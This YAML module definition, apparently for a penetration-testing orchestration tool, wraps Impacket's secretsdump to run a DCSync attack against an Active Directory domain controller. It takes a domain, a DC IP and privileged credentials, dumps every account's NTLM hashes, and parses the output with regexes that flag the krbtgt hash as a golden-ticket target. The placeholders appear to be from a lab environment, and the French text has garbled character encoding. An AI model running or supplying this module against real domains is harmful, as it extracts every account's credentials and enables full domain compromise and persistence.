id: impacket_dcsync
name: DCSync (Secretsdump)
category: Exploitation
description: "RÃ©cupÃ¨re les hashs NTLM du domaine via le protocole de rÃ©plication (DRSUAPI)."
inputs:
  - name: domain
    label: "Domaine"
    placeholder: north.sevenkingdoms.local
  - name: dc_ip
    label: "IP du DC"
    placeholder: 10.3.10.11
  - name: username
    label: Utilisateur (PrivilÃ©giÃ©)
    placeholder: administrator
  - name: password
    label: Mot de passe
    placeholder: password

command: "secretsdump '{{domain}}/{{username}}:{{password}}@{{dc_ip}}' -just-dc-ntlm"

parsing:
  mode: "text"
  
  rules:
    - name: "Hash NTLM Extrait"
      regex: "^(?!(?:Pbkdf2|dq|dr|p|q)\\b)(.+?):\\d+:([a-fA-F0-9]{32}):([a-fA-F0-9]{32}):::"
      badge: "ðŸ”‘ [HASH]"

    - name: "Compte KRBTGT (Critique)"
      regex: "^krbtgt:\\d+:.*"
      badge: "ðŸ‘‘ [GOLDEN]"